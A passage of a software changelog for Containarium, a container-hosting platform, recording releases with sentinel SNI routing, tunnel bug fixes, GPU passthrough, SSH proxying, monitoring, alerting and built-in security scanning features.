  - **Pool-scoped peer discovery** — `containarium daemon --pool=<name>` makes the primary's `PeerPool.discover()` append `?pool=` to its sentinel call, so a primary sees only its own pool's peers.
  - **Primary self-registration** — `containarium daemon --public-hostname=<host> --public-port=<port>` makes the daemon `POST /sentinel/primaries` at startup, heartbeat every 30s, and `DELETE` on shutdown. Sentinel evicts entries that miss heartbeats for 90s. The sentinel auto-fills the primary's IP from the request's `RemoteAddr` so the daemon doesn't need to know its own routable address.
  - **SNI-based routing on the sentinel** — The HTTPS dispatcher peeks the TLS ClientHello SNI and looks up the matching primary via the registry, forwarding TCP bytes (still TLS passthrough) to that primary's IP:port. Connections with no SNI, malformed handshakes, or unregistered hostnames fall back to the existing single-backend forwarding — fully back-compat for unpooled deployments.
  - **Hostname aliases for app domains** — `--public-aliases foo.example,bar.example` (also `Primary.Aliases` in the registry) lets a primary advertise every hostname its Caddy serves, not just its own subdomain. The SNI router matches against `Hostname` plus all `Aliases`, so app domains like `api.example.com` route to the correct pool's primary instead of falling through to the legacy single-backend default.
  - **Primary registration via tunnel handshake** — `containarium tunnel --public-hostname=<host> --public-aliases=… --public-port=443` (also exposed in `setup-peer.sh`) tells the sentinel to promote that tunnel into a primary registry entry pointing at its loopback alias. Lets a primary VM behind NAT/Tailscale register itself without needing direct HTTP access to `/sentinel/primaries`. The tunnel disconnect cleans up the primary entry automatically. SNI routing then forwards inbound TLS bytes back through the same tunnel.
  - **Token-bound pool authorization** — `containarium sentinel --tunnel-token-policy <token>=<pool1>,<pool2>` (repeatable) replaces "any token can claim any pool" with explicit `token → []allowed_pools` rules. A token restricted to `lab` can no longer register a tunnel claiming `pool=prod`. The legacy `--tunnel-token` keeps working as a wildcard rule (any pool allowed). Use `*` as a pool name for explicit wildcard. Adds a typed `Pool` (Go `type Pool string`) with a `PoolAny` constant so the policy rules and registry lookups can't be confused with hostnames or other strings.
  - **SNI router uses yamux for tunneled primaries** — When a primary is tunnel-promoted (slice 6), its `IP` is a sentinel-side loopback alias. Going through a TCP listener on that alias would conflict with the sentinel's own ConnMux on `:443`. Slice 8 fixes this: the SNI dispatcher detects `Primary.BackendID != ""` and uses `TunnelRegistry.DialTunnel(spotID, port)` to open a yamux stream straight to the primary's local port, bypassing any sentinel-side TCP listener for that port. The tunnel server also skips binding a loopback proxy listener for `PublicPort` to avoid the noisy "address already in use" log line.

### Fixed
- **Tunnel handshake over-read corrupts yamux** — `readHandshake` and `readHandshakeResponse` used `json.NewDecoder` over the raw connection. Its internal buffer can swallow bytes that arrive in the same TCP packet as the JSON (e.g., the yamux SYN frame the sentinel writes immediately after the handshake response when keysync starts). Those buffered bytes are unreachable once the decoder is discarded, so yamux's frame reader misaligns and produces `Invalid protocol version: <byte>` errors — observed in production when a backend host reconnected under load and saw `version: 71` (the `'G'` from a buffered HTTP `GET`). Fix: read line-delimited (newline-terminated) JSON, leaving any subsequent bytes on the underlying reader for yamux. Both sides updated. Latent bug present since the original tunnel implementation; not specific to slice 8 even though the slice 8 deploy is what surfaced it.
- **Tunnel-promoted primaries decay after 90s TTL** — `PrimaryRegistry.All()` evicts entries whose `LastHeartbeat` is older than `PrimaryTTL` (90s). Tunnel-promoted primaries (slice 6) only get `LastHeartbeat` set at handshake time and have no heartbeat refresher, so they silently drop out of `/sentinel/primaries` 90s after registration even though the yamux session stays up. Fix: skip TTL eviction for entries with `BackendID` set. Their lifetime is tied to the yamux session via `OnTunnelConnect` / `OnTunnelDisconnect` (`UnregisterByBackendID`); TTL is for HTTP-registered primaries that may have died without `DELETE`'ing.
- **Lab pool bring-up: 4 issues caught while standing up first tunneled primary**
  - **Subnet drift between `--network-subnet` flag and actual incusbr0** (`internal/cmd/daemon.go`): Incus' `EnsureNetwork` is idempotent and won't change a pre-existing bridge's subnet. The daemon used to trust the flag value and pass it as `HostIP` for Caddy reverse_proxy upstreams, traffic-collector network filter, etc. — when the bridge's actual subnet differed (e.g., `10.52.59.0/24` from `incus admin init --auto` vs `--network-subnet=10.0.4.1/24`), Caddy proxied to a non-existent gateway and returned silent 502s. Fix: after `InitializeInfrastructure`, query `GetNetworkSubnet("incusbr0")` and use that as the authoritative subnet, logging the override if different.
  - **Port forwarder missing OUTPUT-chain DNAT** (`internal/network/portforward.go`): tunnel-promoted primaries (slice 6) have the tunnel client receive a yamux stream and dial `127.0.0.1:443` to forward bytes locally. PREROUTING DNAT alone doesn't catch local-origin packets; OUTPUT chain is needed. Added `ensureOutputRule(port)` alongside the existing `ensurePreRoutingRule(port)`, with per-rule idempotency so an upgraded deploy with PREROUTING but not OUTPUT picks up the missing rule on next setup.
  - **`route_localnet=1` not enabled** (`internal/network/portforward.go`): even with the OUTPUT DNAT in place, the kernel's default `route_localnet=0` refuses to route `127.0.0.0/8` packets out a non-loopback interface. The port forwarder now sets `net.ipv4.conf.all.route_localnet=1` at runtime and persists it via `/etc/sysctl.d/99-containarium-route-localnet.conf`.
  - **Caddy TLS app missing on first install** (`internal/app/proxy.go`): `ProvisionTLS` PATCHed `/config/apps/tls/automation/policies` directly, but on a fresh Caddy `apps.tls` is `null` — Caddy returned 400 `invalid traversal path`. The `ensureTLSApp` helper already existed (creates `apps.tls` with a default ACME policy via PUT) but wasn't being called from `ProvisionTLS`. Wired it in, and made the null check robust to Caddy's `"null\n"` (with trailing whitespace) response.
  - **Port forwarder runs before Caddy spawned** (`internal/server/dual_server.go`): on first install, the daemon's auto-detect-Caddy step at startup runs BEFORE `EnsureCaddy` spawns the Caddy container. The auto-detect logged a warning and skipped port-forward setup; first deploys required a daemon restart to pick it up. Fix: re-run `PortForwarder.SetupPortForwarding` immediately after `EnsureCaddy` succeeds.
- **Postgres restart policy missing on auto-detected containers** (`internal/server/dual_server.go`): when the daemon auto-detects an existing `containarium-core-postgres` container (the path used by primaries running without `--app-hosting`, e.g. prod), it just records the connection string and never invokes `ensurePostgresRestartPolicy()`. Result: postgres has no `Restart=on-failure` systemd override, and an OOM kill leaves it down indefinitely (we hit a 12-day silent outage that took down Grafana). Fix: re-apply the policy on the auto-detect path; idempotent.
- **GPU device passthrough breaks across kernel upgrades** (`internal/incus/client.go`, `internal/container/manager.go`): containers were configured with `gpu: { id: "0", type: gpu }`, where `id` is Incus' DRM card minor index. When a kernel upgrade renumbers DRM minors (observed on a backend host across a `6.8.0-110` → `6.8.0-111` point-release, where the GPU's DRM minor moved from `card0` to `card1`), every container with `id: "0"` fails to start with `Failed to detect requested GPU device`. Fix: new `Client.ResolveGPUInputToPCI()` resolves the user's `--gpu N` (positional index) or PCI string into the GPU's PCI address at container creation time. Containers always get pinned by PCI, which is stable across reboots and kernel changes. Existing containers with `id`-based config aren't auto-migrated; document the manual fix in the runbook (see `incus config device set <name> gpu pci=<addr>`).
- **Lab pool SSH lands at host nologin instead of inside the container** (`scripts/install-lab-phase-b.sh`, `internal/container/jump_server.go`): the lab install script never installed `/usr/local/bin/containarium-shell`, so the daemon's `getUserShell()` fell back to `/usr/sbin/nologin` when creating per-container host users. SSH then authenticated successfully but the upstream sshd ran nologin and printed "This account is currently not available." Fix: install-lab-phase-b.sh now installs the wrapper and writes `/etc/motd` with the standard Containarium banner labelled `${POOL} pool` (idempotent — both steps no-op if already in place). The daemon also stops writing `~/.hushlogin` when creating users; the host MOTD *is* the Containarium banner and was the only signal that the session was going through the proxy hop. Existing per-container host users keep their stale `.hushlogin` until manually removed.

### Added
- **GPU stacks** — New `gpu` (nvidia-utils-570, CUDA toolkit, cuDNN) and `gpu-docker` (CUDA + Docker CE + nvidia-container-toolkit) stacks for container provisioning
- **Peer metrics federation** — Local metrics collector pushes peer container and system metrics to VictoriaMetrics with `backend_id` labels; Grafana dashboard adds Backend Node dropdown and per-node panels
- **Container provisioning state** — New `CONTAINER_STATE_PROVISIONING` proto enum shows stack installation progress during async container creation
- **Auto ClamAV scan** — Newly created containers are automatically enqueued for ClamAV scanning with a 2-minute delay
- **Peer API forwarding** — Sentinel forwards metrics, system info, security summary, and container traffic requests to peer backends with service token auth
- **Per-backend system info** — `backend_id` field on SystemInfo and `peers` field on GetSystemInfoResponse for multi-backend visibility
- **ZFS backup** — `setup-gpu-host.sh` auto-detects disks, creates HDD RAID1 mirror as `incus-backup` pool, installs daily ZFS backup cron

### Changed
- **Grafana dashboard** — Reorganized with `$backend` template variable, "Node Metrics" row (CPUs, containers, memory, disk, load), and "Container Metrics" row with per-backend filtering
- **setup-gpu-host.sh** — Rewritten with `--data-disk`, `--backup-disks`, `--yes` flags and auto-detection of unused NVMe/HDD disks
- **containarium-shell** — Added ASCII banner for interactive sessions, non-interactive `-c` command support, and auto-detected incus binary path for sudoers

### Fixed
- **SSH non-interactive command forwarding** — `containarium-shell` now handles `-c "command"` arguments from sshpiper exec forwarding, in addition to `SSH_ORIGINAL_COMMAND`
- **sshpiper authorized_keys parsing** — Strip blank lines and comments before writing; sshpiper's parser stopped at blank lines, preventing key matching
- **Tunnel loopback IP reuse** — Reconnecting tunnel clients reuse their previous loopback IP, preventing stale sshpiper config and SSH failures during reconnects
- **Tunnel clean shutdown** — Close yamux session on context cancel to avoid 90-second SIGKILL timeout
- **Peer metrics parsing** — Use `protojson.Unmarshal` for gRPC-gateway enum strings and `json.Number` for quoted numeric values

## [0.14.0] - 2026-03-28

### Added
- **Multi-backend peer operations** — Resize, CleanupDisk, and Collaborator operations (Add/Remove/List) now forward to peer backends when the container is not local
- **Terminal WebSocket peer routing** — Terminal sessions proxy to peer backends transparently via `PeerTerminalProxy` interface; the gateway bridges WebSocket connections between client and peer
- **Per-backend system info API** — New `GET /v1/backends/{id}/system-info` endpoint returns CPU, memory, disk, and GPU info for a specific backend
- **GPU system info** — `GPUVendor` and `GPUModel` proto enums, `GPUInfo` message with vendor/model/driver/CUDA/VRAM fields, populated from Incus server resources
- **Web UI node filter and search** — Real-time search by name/username/IP, node dropdown filter (when multiple backends), filtered count display, backend chip on grid cards
- **Web UI backend resource selector** — Toggle button group on System Resources card to view CPU/memory/disk/GPU stats per backend, with auto-refresh
- **SSH container proxy (`containarium-shell`)** — Login shell that proxies SSH sessions into containers via `incus exec`, enabling unified `ssh user@sentinel` for all backends including firewalled/NAT hosts
- **Setup script** `scripts/setup-ssh-container-proxy.sh` — Installs containarium-shell, sudoers rule, and /etc/shells entry

### Fixed
- **Tunnel SSH port conflict** — Tunnel server uses port 20022 for SSH proxy listeners on loopback aliases, preventing conflict with sshpiper's `*:22` binding on the sentinel
- **NVIDIA GPU model name** — Fixed duplicate brand prefix in model name string from Incus nvidia sub-struct


### Added
- **OWASP ZAP web application scanning** — New "ZAP Scan" tab under Security for automated web application vulnerability scanning of all exposed Containarium endpoints.
  - Full gRPC service with 8 RPCs: trigger scan, list scans, list alerts, get summary, suppress alert, get config, download report, install ZAP
  - PostgreSQL persistence with 3 tables (`zap_scan_runs`, `zap_alerts`, `zap_scan_jobs`) and fingerprint-based alert deduplication
  - Async job queue with 2 concurrent workers and configurable scan interval (default 30 days)
  - Spider + active scan per target URL via ZAP daemon REST API running inside the security container
  - HTML/JSON report generation and download per scan run
  - React UI with summary cards, alert table with risk/status filters, pagination, suppress dialog, CSV/JSON export, scan history with report download, and one-click ZAP installation
  - Proto definitions (`proto/containarium/v1/zap.proto`), server implementation, and REST gateway
- **Pentest findings download** — Download all filtered pentest findings as CSV or JSON from the Security > Pentest tab. The download respects current severity/category/status filters and fetches up to 1000 findings per target type.

### Changed
- **Security tools moved to container** — nuclei, trivy, and ZAP now install and run inside the `containarium-core-security` container instead of the host filesystem, freeing ~290MB on the root disk. The pentest installer, nuclei module, and trivy module all use `incus exec` to operate inside the container. Trivy mounts target container rootfs via disk devices.

### Fixed
- **Port-scan findings misclassified as domain findings** — The `ports` scanner module now only runs on container targets, preventing open-port findings from appearing under "Domain Findings". Existing misclassified findings are automatically reclassified on startup.

## [v0.13.0] - 2026-03-15

### Added
- **Penetration testing system** — Built-in security scanner with 7 modules that scan container endpoints and dependencies:
  - **Built-in modules**: `ports` (open port detection), `headers` (HTTP security header audit), `tls` (weak protocol/cipher/cert checks), `web` (exposed .env/.git/debug endpoints), `dns` (dangling CNAMEs, missing SPF/DMARC/DKIM)
  - **External tool modules**: `nuclei` (template-based vulnerability scanning) and `trivy` (container filesystem CVE scanning via rootfs inspection) — auto-installable from the UI
  - 8 gRPC/REST endpoints (`/v1/pentest/*`): trigger scans, list findings with severity/category/status filters, suppress findings, view scan history, install tools
  - Async job queue with 5 concurrent workers, SHA-256 fingerprint-based finding deduplication, scheduled scans (default 24h), 90-day retention
  - Proto definitions (`proto/containarium/v1/pentest.proto`), server implementation, and web UI (Security > Pentest tab)
- **Demo page: Alerts, Audit, and Pentest tabs** — Complete demo coverage with mock data for all tabs including alert rules, webhook delivery history, audit logs, and grouped pentest findings.

### Changed
- **Pentest findings grouped by container** — The Security > Pentest tab now groups findings by container name instead of showing a flat list. Each group has a collapsible header showing the container name and finding count, sorted by most findings first.
- **README screenshots updated** — Replaced numbered screenshots with descriptive names; added Alerts and Audit sections.
- **Next.js upgraded to 16.1.6** — Security update addressing CVE-2025-66478 (RCE), CVE-2025-55182/55183/55184 (RSC vulnerabilities), and CVE-2026-23864 (DoS).

## [v0.12.0] - 2026-03-15

### Added
- **Alerting system with vmalert + Alertmanager** — Metric-based alerting integrated into the daemon via VictoriaMetrics vmalert (v1.108.1) and Prometheus Alertmanager (v0.27.0), running inside the `core-victoriametrics` container.
  - 9 default alert rules: `HighMemoryUsage`, `HighDiskUsage`, `DiskAlmostFull`, `HighCPULoad`, `MetricsCollectionDown`, `ContainerHighMemory`, `ContainerHighCPU`, `ContainerStopped`, `NoRunningContainers`
  - Custom alert rule CRUD via gRPC/REST API (`/v1/alerts`) with PostgreSQL persistence
  - Webhook notifications with optional HMAC-SHA256 payload signing (`X-Containarium-Signature` header) via an internal relay
  - Webhook delivery history tracking (`/v1/system/alerting/deliveries`) with 1000-row / 30-day retention
  - Idempotent setup — detects existing vmalert install and only updates rules on restart
- **Alerts web UI** (`/webui/alerts/`) — Full management interface with tabs for default rules, custom rules, and delivery history. Clickable rule rows open a detail dialog showing the full PromQL expression, equivalent vmalert YAML, and a PromQL writing guide. Webhook configuration dialog with HMAC secret generation and inline verification code examples (Python, Go, Node.js).
- **Alert proto definitions** (`proto/containarium/v1/alert.proto`) — 8 new RPCs: `CreateAlertRule`, `ListAlertRules`, `GetAlertRule`, `UpdateAlertRule`, `DeleteAlertRule`, `GetAlertingInfo`, `UpdateAlertingConfig`, `TestWebhook`, `ListWebhookDeliveries`
- **OCI runtime wrapper for Docker cgroup limit injection** — Registers a custom OCI runtime (`containarium-runtime`) as Docker's default via `daemon.json`. Intercepts every `runc create` — from CLI, Compose v2, or API — and injects LXC memory/CPU cgroup limits into the OCI spec. Also bind-mounts LXCFS-backed `/proc` files (`meminfo`, `cpuinfo`, `stat`, etc.) so tools like `free` and `top` report correct values inside nested containers. See [`docs/OCI-RUNTIME-CGROUP-INJECTION.md`](docs/OCI-RUNTIME-CGROUP-INJECTION.md).
- **Automatic OCI runtime upgrade on daemon startup** — `UpgradeCgroupWrappers()` now installs the OCI runtime on all existing Docker containers, in addition to CLI wrappers
- **Caddy L4 SNI-based TLS passthrough** — mTLS gRPC services are now exposed on `:443` via SNI hostname routing, eliminating the need for per-port GCP firewall rules and sentinel iptables forwarding. Caddy L4 inspects the TLS ClientHello SNI field without decrypting, preserving end-to-end mTLS.
- **L4ProxyManager** (`internal/app/l4_proxy.go`) — manages Caddy L4 TLS passthrough routes via the admin API using atomic `/load` config replacement
- **Lazy L4 activation** — the L4 layer activates only when TLS passthrough routes exist in the database and deactivates automatically when all are removed
- **TLS Passthrough protocol** (`tls_passthrough`) — new route protocol in protobuf, route store, and sync job (`ROUTE_PROTOCOL_TLS_PASSTHROUGH = 5`)
- **Custom Caddy build with L4 plugin** — `setupCaddy()` now builds Caddy via xcaddy with `github.com/mholt/caddy-l4` instead of stock apt install
- **TLS Passthrough section in Network UI** — dedicated table section with VpnLockIcon showing SNI-routed connections on `:443`
- L4 config types (`CaddyL4App`, `CaddyL4Server`, `CaddyL4Route`, etc.) in `internal/app/caddy_types.go`

### Changed
- **Add Route form simplified** — removed the old "Passthrough (TCP/UDP)" route type selector; all routes now use a unified form with Protocol dropdown (HTTP / gRPC / TLS Passthrough)
- **RouteSyncJob** splits routes by protocol: HTTP/gRPC routes sync to ProxyManager, `tls_passthrough` routes sync to L4ProxyManager
- **HTTP server port handoff** — when L4 is active, the HTTP server moves from `:443` to `:8443` with `tls_connection_policies`; L4 catch-all routes non-matching SNI back to the HTTP server

### Fixed
- **Docker Compose v2 containers now see correct cgroup limits** — Previously, Compose v2 bypassed the CLI wrapper (it uses the Docker Engine API directly), so compose-managed containers saw the host's full resources instead of the LXC cgroup limits. The OCI runtime wrapper fixes this at the runc level.
- **`free` / `top` inside Docker containers now report correct memory** — LXCFS bind mounts are passed through from the LXC container into nested Docker containers via the OCI runtime

### Removed
- Old per-port TCP/UDP passthrough form in the Add Route dialog (replaced by TLS passthrough on `:443`)

## [v0.11.0] - 2026-03-11

### Added
- **ClamAV security scanning** — Full antivirus integration via a `containarium-core-security` container running ClamAV. Scans container root filesystems by mounting them read-only into the security container.
  - Persistent scan reports in PostgreSQL (`clamav_reports` table) with filtering by container, status, and date range
  - CSV export via `GET /v1/security/clamav-reports/export`
  - Per-container summary API (`GET /v1/security/clamav-summary`) with clean/infected/never-scanned counts
  - Automatic daily background scan cycle with 90-day report retention
- **Async scan job queue** — ClamAV scans now run asynchronously via a PostgreSQL-backed job queue (`scan_jobs` table), replacing the previous synchronous blocking approach.
  - `POST /v1/security/clamav-scan` returns immediately with queued job count instead of blocking for 10+ minutes
  - 3-worker pool processes scans concurrently, polling the queue with `FOR UPDATE SKIP LOCKED` for safe concurrent claiming
  - Automatic retries (up to 2) for transient failures (e.g., stale mount errors)
  - Jobs survive daemon restarts — pending/failed-retryable jobs resume automatically
- **Scan status API** — New `GET /v1/security/scan-status` endpoint returns real-time queue state: per-job details and aggregate pending/running/completed/failed counts
- **Security dashboard** — New `/security` page in the web UI
  - Summary cards: total, clean, infected, and never-scanned container counts
  - Container table sorted by severity (infected first), with expandable per-container scan history
  - Context-aware per-container scan action icons reflecting job queue state: hourglass (queued), spinner (running), green checkmark (completed), red error with tooltip (failed), scanner icon (idle)
  - Real-time scan progress bar with status counts, polls every 5 seconds during active scans
  - Date range picker for CSV report download
- **Core services section** — New panel in the web UI showing infrastructure container status (PostgreSQL, Caddy, VictoriaMetrics, ClamAV) via `GET /system/core-services`
- **Stack install CLI** — New `containarium install-stack` command for deploying predefined container stacks

### Changed
- **`SecurityService` proto** — New gRPC service with 4 RPCs: `ListClamavReports`, `TriggerClamavScan`, `GetClamavSummary`, `GetScanStatus`. Auto-registered on the gRPC-gateway for REST access.

## [v0.10.0] - 2026-03-09

### Added
- **Monitoring stack** — Auto-provision VictoriaMetrics + Grafana as a core service container (`containarium-core-victoriametrics`). A single consolidated dashboard is embedded in the web UI Monitoring tab via a `/grafana/` reverse proxy, rendered in kiosk mode with light theme.
  - System metrics: CPU load (1m/5m/15m), memory/disk gauges, running/stopped container counts
  - Per-container metrics: CPU usage (cores via `rate()`), memory, disk, network I/O
  - Grafana uses existing PostgreSQL for config database, file-based dashboard provisioning
- **OpenTelemetry metrics collector** — In-process OTel SDK pushes system and per-container metrics every 30s via OTLP/HTTP to VictoriaMetrics (`internal/metrics/otel.go`)
- **HTTP metrics middleware** — Tracks API request rate and latency histograms (`internal/metrics/http_middleware.go`)
- **`GetMonitoringInfo` API** — New gRPC/REST endpoint (`GET /v1/system/monitoring`) returning Grafana URL, VictoriaMetrics URL, and enabled status
- **Disk cleanup API** — Disk cleanup endpoint, route toggle, and URL-based tab routing (#42)
- **Stop container API** — Add stop container endpoint (#41)

### Fixed
- **Passthrough routes now persist across VM restarts** — TCP/UDP port-forwarding rules (iptables DNAT) were purely ephemeral and lost on VM recreation. They are now stored in PostgreSQL as the source of truth, mirroring the existing `RouteStore`/`RouteSyncJob` pattern for HTTP proxy routes (#39).
- **Subdomain concatenation** — Fix subdomain being incorrectly concatenated in certain configurations (#40)

## [0.9.1] - 2026-02-28

### Fixed
- **Boot disk size validation** — Lowered minimum from 100GB to 10GB to support production environments with small boot disks (e.g., sentinel VMs).

## [0.9.0] - 2026-02-28

### Changed
- **Terraform module consolidation** — Extracted all infrastructure resources into a reusable module at `terraform/modules/containarium/`. The dev consumer (`terraform/gce/`) and any production deployment can now consume a single source of truth via `git::` module source, eliminating config drift.
- **Startup scripts parameterized** — `fail2ban_whitelist_cidr` and `jwt_secret` are now Terraform template variables instead of hardcoded values, allowing the same scripts to serve different environments (e.g., `10.128.0.0/9` for default network vs `10.0.0.0/8` for VPC).
- **Sentinel runs in same region as spot VM** — Removed `sentinel_region`/`sentinel_zone` variables. Sentinel always deploys in the same zone as the spot VM, matching the production topology.
- **Go embed package rewritten** — Replaced broken `//go:embed` directives (Go doesn't allow `../` in embed paths) with `runtime.Caller()` + `os.ReadFile()` approach. Exports `TerraformDir()`, `ConsumerDir()`, `ModuleDir()` helpers.
- **E2E test updated** — Test workspace now copies the full `gce/` + `modules/` tree so relative module source paths resolve correctly.

### Added
- **`terraform/modules/containarium/`** — New shared Terraform module containing all GCE resources (VMs, firewall rules, disks, startup scripts). Parameterizes environment differences via variables:
  - `network_self_link` / `subnetwork_self_link` — VPC vs default network
  - `spot_vm_external_ip` — ephemeral IP vs Cloud NAT only
  - `enable_iap_firewall` / `enable_health_check_firewall` — production firewall rules
  - `enable_glb_backend` — unmanaged instance group for GLB
  - `jwt_secret` — REST API authentication (empty = auto-generate)
  - `fail2ban_whitelist_cidr` — internal network whitelist
  - `instance_tags` — customizable network tags
  - `spot_vm_name_suffix` — appended to instance name for spot VM (e.g., `-spot`)
- **Production consumer example** at `terraform/modules/containarium/examples/production-consumer/` showing how to consume the module with VPC networking, GLB backend, and IAP firewall rules.

### Removed
- **`horizontal-scaling.tf`** — Horizontal scaling (multiple independent jump servers behind an NLB) is incompatible with the sentinel architecture. Multi-region scaling uses one sentinel+spot pair per region instead.
- **`null_resource` provisioners** — Removed binary SCP provisioners (`copy_containarium_binary`, `copy_binary_to_sentinel`). Binary deployment now uses `containarium_binary_url` exclusively.
- **`ssh_private_key_path` variable** — No longer needed without SCP provisioners.
- **Horizontal scaling example tfvars** (`horizontal-scaling-3-servers.tfvars`, `horizontal-scaling-5-servers.tfvars`).

### Fixed
- **`zpool import -f` in startup-spot.sh** — Forces ZFS pool import when the pool was last used by a different system (common after spot VM recreation). Previously could fail silently.
- **Incus pre-removal in startup-spot.sh** — Removes Ubuntu 24.04's pre-installed Incus 6.0.0 before installing from Zabbly repo, avoiding package conflicts.

## [0.8.2] - 2026-02-28

### Added
- **sshpiper SSH reverse proxy on sentinel** — Deploys [sshpiper](https://github.com/tg123/sshpiper) on sentinel port 22 as an L7 SSH proxy with built-in `failtoban` plugin. Bans client IPs after 3 failed auth attempts (1h ban). Replaces iptables DNAT for SSH, which masked real client IPs and caused fail2ban on the spot VM to ban the sentinel itself.
- **Authorized keys sync** — New `KeyStore` in sentinel syncs SSH authorized keys from the spot VM via `/authorized-keys` HTTP endpoint. Generates sshpiper YAML config mapping each user to the upstream spot VM. Sync runs every 2 minutes; sshpiper is only restarted when config actually changes (avoids killing active sessions).
- **`/authorized-keys` HTTP endpoint** on the spot VM daemon — Returns all jump server users' SSH public keys as JSON. Used by sentinel's KeyStore to build sshpiper routing config.
- **`/authorized-keys/sentinel` POST endpoint** on the spot VM daemon — Accepts the sentinel's upstream public key and appends it to all jump server users' `authorized_keys`, enabling sshpiper to authenticate to the spot VM on behalf of users.
- **Key sync status on sentinel dashboard** — SSH Proxy (sshpiper) section shows synced user count, last sync time, and errors.
- **fail2ban whitelist on spot VM** — Whitelists internal VPC ranges so the sentinel IP is never banned as a safety net.

### Changed
- **Sentinel sshd moved to port 2222 only** — sshd on the sentinel now listens on port 2222 only (management/IAP access). Port 22 is owned by sshpiper. Includes systemd socket override for Ubuntu 24.04 socket activation.
- **Port 22 removed from iptables DNAT** — `enableForwarding()` in `iptables.go` now filters port 22 from the forwarded ports list. SSH traffic reaches sshpiper on the sentinel directly instead of being DNAT'd to the spot VM.
- **Default forwarded ports** — Changed from `22,80,443,50051` to `80,443,50051` in the sentinel CLI.

### Fixed
- **SSH brute-force attacks no longer block all users** — Previously, attackers hitting sentinel:22 were DNAT'd with MASQUERADE to the spot VM, which saw all connections from the sentinel's IP. fail2ban on the spot VM would ban the sentinel IP, blocking all SSH. sshpiper now handles SSH at L7, sees real client IPs, and bans attackers directly.

### Security
- sshpiper `failtoban` plugin provides IP-level banning based on actual SSH auth failures (not connection rate), correctly identifying attackers vs. legitimate users.
- Sentinel's upstream key is automatically distributed to all jump server accounts, so sshpiper can authenticate to the spot VM without storing user private keys.

## [0.8.1] - 2026-02-27

### Fixed

- **Spot VM preemption recovery race condition**: daemon now waits for core containers (PostgreSQL, Caddy) to be healthy before auto-detection and config loading, preventing permanent route loss after VM restart
- **PostgreSQL connection retry**: all connection sites (daemon config, route store, collaborator store) retry up to 5 times with 3-second intervals instead of failing on first "connection refused"
- **Container outbound internet broken by sentinel iptables**: sentinel PREROUTING jump now excludes the container bridge network (`! -s 10.0.3.0/24`), fixing HTTPS from containers being DNAT'd to the spot VM's own IP instead of reaching the internet

### Changed

- **Label-based core container identification**: core containers tagged with `user.containarium.role` labels (`core-postgres`, `core-caddy`) instead of hardcoded name matching; existing containers auto-backfilled on startup
- **Boot priority ordering**: core containers have `boot.autostart.priority` (PostgreSQL=100, Caddy=90) so Incus starts them in correct order after restart
- **Type-safe `incus.Role` type**: introduced typed string for core container roles replacing raw string comparisons
- **Core containers hidden from user listings**: containers with a `user.containarium.role` label excluded from `ListContainers` API

## [0.8.0] - 2026-02-27

### Added
- **Sentinel TLS certificate sync** — sentinel syncs real Let's Encrypt certificates from spot VM's Caddy server, serves valid HTTPS during maintenance mode instead of self-signed certs
  - New `/certs` endpoint on daemon gateway exports Caddy certificates as JSON
  - `CertStore` with SNI-based lookup: exact domain → wildcard → self-signed fallback
  - New daemon flag: `--caddy-cert-dir` (default: `/var/lib/caddy/.local/share/caddy`)
  - New sentinel flag: `--cert-sync-interval` (default: `6h`)
  - Immediate cert sync on recovery (MAINTENANCE → PROXY transition)
- **Sentinel status page** — real-time recovery information at `/sentinel` during maintenance mode
  - Shows: current mode, spot VM IP, forwarded ports, preemption count, last preemption, outage duration, cert sync status
  - Dark theme matching maintenance page, auto-refreshes every 10s
- **Sentinel JSON status API** — machine-readable `/status` endpoint on binary server port (8888), always available regardless of mode
- **Management SSH on port 2222** — sentinel listens on port 2222 for direct management access (port 22 is DNAT'd to spot VM in proxy mode)
  - Startup script configures sshd to listen on both port 22 and 2222
  - New Terraform firewall rule: `sentinel_mgmt_ssh` for port 2222
- **`docs/SENTINEL-DESIGN.md`** — comprehensive sentinel architecture documentation covering modes, TLS cert sync, status page, CLI reference, one-sentinel-to-many-spot-VMs scaling, Terraform config, and operational runbook

### Changed
- Updated README.md architecture to reflect one-sentinel-to-many-spot-VMs scaling model
- Updated `SPOT-RECOVERY.md`, `SPOT-INSTANCES-AND-SCALING.md`, `HORIZONTAL-SCALING-ARCHITECTURE.md`, `terraform/gce/README.md` to reference new `SENTINEL-DESIGN.md`
- Sentinel startup script: fixed `systemctl restart sshd` → `ssh || sshd || true` for Ubuntu compatibility

## [0.7.0] - 2026-02-25

### Added
- **Collaborator permission levels** — fine-grained access control when adding collaborators
  - `--sudo` flag grants full sudo access (`ALL=(ALL) NOPASSWD: ALL`) instead of restricted `su - owner`
  - `--container-runtime` flag adds collaborator to docker/podman groups for container runtime access
  - New proto fields: `grant_sudo`, `grant_container_runtime` on `AddCollaboratorRequest`; `has_sudo`, `has_container_runtime` on `Collaborator`
  - PostgreSQL schema migration adds `has_sudo` and `has_container_runtime` columns
  - Web UI: checkboxes in Add Collaborator form, permission badges (sudo/docker chips) in collaborator table
  - CLI: `containarium collaborator add alice bob --ssh-key bob.pub --sudo --container-runtime`
- **Docker CE software stack** — proper Docker installation as a stack option
  - New `docker` stack in `configs/stacks.yaml` with Docker CE apt repository setup
  - Installs `docker-ce`, `docker-ce-cli`, `containerd.io`, `docker-compose-plugin`
  - Automatically adds user to `docker` group when docker stack is selected
  - Web UI: Docker Development option in stack selection dropdown
- **Stack pre-install commands** — `pre_install` field in Stack struct for commands that run as root before `apt-get install` (e.g., adding apt repositories)
- **Daemon config persistence in PostgreSQL** for self-bootstrapping after VM recreation
  - New `daemon_config` key-value table stores: `base_domain`, `http_port`, `grpc_port`, `listen_address`, `enable_mtls`, `enable_rest`, `enable_app_hosting`
  - Auto-detect PostgreSQL container IP from Incus (`containarium-core-postgres`) — no `--postgres` flag needed
  - On startup, loads saved config from DB; CLI flags always override DB values (`cmd.Flags().Changed()`)
  - On successful start, saves current config back to DB for next boot
  - New `DaemonConfigStore` in `internal/app/daemon_config_store.go` with `Get`, `Set`, `GetAll`, `SetAll` methods
  - Systemd service reduced from 6 flags to 2: `--rest --jwt-secret-file /etc/containarium/jwt.secret`
  - JWT secret intentionally kept out of PostgreSQL (remains on filesystem)
- **`containarium service install` command** for single-command systemd service setup
  - Writes the canonical service file with correct `ReadWritePaths` (includes `/var/lock` for useradd flock)
  - Generates JWT secret file if it doesn't exist
  - Enables and starts the service automatically
  - Replaces inline heredocs in `hacks/install.sh`, `terraform/gce/scripts/startup.sh`, and `startup-spot.sh`
  - Also: `containarium service status` and `containarium service uninstall`
- **AppServer graceful degradation** — `/v1/apps` returns empty list instead of 501 when app hosting is disabled
- Collaborator management for containers (add/remove/list collaborators)

### Fixed
